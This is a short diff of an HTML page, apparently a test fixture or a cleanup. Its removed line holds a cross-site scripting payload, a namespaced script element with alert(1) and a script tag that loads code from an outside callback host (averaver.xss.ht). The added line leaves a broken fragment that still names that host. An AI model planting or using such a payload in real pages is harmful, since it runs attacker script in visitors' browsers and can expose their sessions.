@@ -1,7 +1,7 @@
 <html>
 	<head></head>
 	<body>
-		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)"><script src=https://averaver.xss.ht></script></something:script>
+		<something:script xmlns:something="http://www.w3.org/1999/xhtml">">src=https://averaver.xss.ht</something:script>
 
 		<info>
 		  <name>
